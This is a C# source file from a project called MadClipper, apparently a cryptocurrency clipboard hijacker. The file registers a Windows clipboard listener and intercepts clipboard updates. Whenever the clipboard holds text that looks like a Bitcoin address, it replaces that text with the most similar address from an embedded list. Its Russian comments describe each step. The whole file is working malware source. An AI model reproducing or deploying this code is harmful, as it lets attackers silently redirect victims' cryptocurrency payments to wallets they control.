using System;
using System.Linq;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using MadClipper.Properties;
using System.Threading;

namespace MadClipper
{
    internal partial class BackgroundForm : Form
    {

        internal BackgroundForm()
        {

            SuspendLayout();
            AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new System.Drawing.Size(383, 191);
            Name = "BackgroundForm";
            Text = "BackgroundForm";
            Load += new EventHandler(BackgroundForm_Load);
            ResumeLayout(false);

            AddClipboardFormatListener(Handle);

        }


        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);


            if (m.Msg != 0x031D) return;


            if (!Clipboard.ContainsText()) return;

            var clpbrd = Clipboard.GetText();

            // шифрование и сжатие
            // если clpbrd уже находится среди адресов, возврат
            if (

                Resources.Addresses.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries)
                    .ToList()
                    .Contains(clpbrd)) return;



            // если clpbrd, вероятно, не BTC адрес возврата
            if (!Check.Clipregex(clpbrd)) return;
            // найти и установить наиболее похожий адрес BTC
            Check.Sets(clpbrd);
            Thread.Sleep(1000);


        }

        private void BackgroundForm_Load(object sender, EventArgs e)
        {

        }

    }
}
